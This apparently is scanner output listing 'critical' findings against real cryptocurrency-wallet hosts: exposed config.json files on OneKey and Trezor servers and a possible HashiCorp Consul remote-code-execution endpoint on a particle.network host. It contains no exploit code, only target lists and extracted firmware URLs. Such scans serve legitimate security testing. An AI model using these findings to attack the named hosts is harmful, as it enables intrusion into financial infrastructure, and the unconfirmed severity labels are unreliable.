+[config-json-exposure-fuzz:endpoints] [http] [critical] https://data.onekey.so/config.json [""url": "https://web.onekey-asset.com/app-monorepo/v6.4.0/OneKey-Wallet-6.4.0-android.apk"",""url": "https://appgallery.huawei.com/app/C107439249"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/classic.3.0.0-Stable-0511-0bf60dd.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.11.0/classic1s.3.11.0-Stable-0318-4b3cbd7_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.align.signed.enc.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.6.0/mini.3.6.0-Stable-1226-ff9efe5.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.11.0/touch.4.11.0-Stable-0606-204425e.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.20.0-Stable-0420-3542e8c_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.11.0/classic.3.11.0-Stable-0908-75f1721.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.7.0/touch.4.7.0-Stable-1227-2c4d945-signed.bin"",""url": "https://snapcraft.io/onekey-wallet"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.19.0/classic1s.3.19.0-Stable-btc-d4d9fab_thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.12.0/classic.3.12.0-Stable-0205-05bae9f.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.16.0/classic1s.3.16.0-Stable-be46692.thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.12.1/classic1s.3.12.1-Stable-1cf7797_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10_merged.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.9.0/mini.3.9.0-Stable-0807-a8b4519.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.2.0/mini.3.2.0-Stable-0802-6903c73.signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/3.4.0/touch.3.4.0-Stable-1120-38abffd-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.14.0-Stable-0704-f23570e_1.1.5_dfc6ccf_0x10_1.1.6_dfcd608_0x13.signed.bin"",""url": "https://play.google.com/store/apps/details?id=so.onekey.app.wallet"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/classic.2.11.0-Stable-0323-c67044f.bin"",""url": "https://common.onekey-asset.com/hw/legacy/2.11.0/mini.2.11.0-Stable-0323-19ff5d9-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.12.0-Stable-0225-5379167_thd89_app_PROD_20250221_1.1.5_dfc6ccf_0x10.signed.bin"",""url": "https://apps.apple.com/us/app/onekey-open-source-wallet/id1609559473"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.4.0/classic.3.4.0-Stable-0917-d38a468.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.2.0/classic.3.2.0-Stable-0802-a013aec.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.4.0/touch.4.4.0-Stable-0807-3e033eb.signed.bin"",""url": "https://common.onekey-asset.com/hw/touch/4.0.0/touch.4.0.0-Stable-0118-e901cef-signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.9.1-Stable-0612-bacaa62.signed.bin"",""url": "https://apps.microsoft.com/store/detail/XPFMHZDDF91TNL"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.10.0/classic.3.10.0-Stable-0512-7031656.signed.bin"",""url": "https://web.onekey-asset.com/hardware/classic1s/firmware/v3.19.0/classic1s.3.19.0-Stable-d4d9fab_thd89_app_PROD_20250813_1.1.7_353c593_0x10.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.10.0/touch.4.10.0-Stable-0304-834ea82.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.18.0-Stable-1217-659efd6_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.signed.bin"",""url": "https://web.onekey-asset.com/hardware/pro/firmware/pro.4.20.0-Stable-btc-0420-3542e8c_thd89_app_PROD_20250813_1.1.7_353c593_0x10_thd89_appfp_PROD_20250813_1.1.7_353c593_0x13.bin"",""url": "https://web.onekey-asset.com/hardware/classic/firmware/v3.9.0/classic.3.9.0-Stable-0805-f3b0717.signed.bin"",""url": "https://web.onekey-asset.com/hardware/touch/firmware/v4.12.0/Touch.4.12.0-Stable-1205-da09c43.signed.bin"",""url": "https://web.onekey-asset.com/hardware/mini/firmware/v3.10.0/mini.3.10.0-Stable-0516-a9a94d6.signed.bin"",""url": "https://common.onekey-asset.com/hw/legacy/3.0.0/mini.3.0.0-Stable-0518-b860d10.signed.bin""] [path="/config.json"]
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/settings.json [""url": "https://github.com/joona/settings.json"",""url": "https://github.com/joona/settings.json/issues""] [path="/settings.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc1.trezor.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc2.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc3.trezor.io/api/v1/config.json [path="/api/v1/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://btc4.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[config-json-exposure-fuzz] [http] [critical] https://etc1.trezor.io/api/v2/config.json [path="/api/v2/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
